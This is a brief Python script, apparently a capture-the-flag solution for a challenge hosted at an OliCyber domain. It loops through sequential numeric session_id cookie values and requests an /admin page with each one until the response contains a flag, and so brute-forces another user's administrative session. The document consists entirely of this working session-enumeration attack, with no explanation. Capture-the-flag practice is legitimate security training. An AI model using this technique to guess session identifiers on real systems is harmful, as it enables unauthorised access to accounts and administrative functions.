import requests
test=""
i=0
while "flag" not in test:
    cookie={"session_id":str(i)}
    r=requests.get("http://too-small-reminder.challs.olicyber.it/admin",cookies=cookie)
    test=r.text
    print(i)
    i+=1
print(test)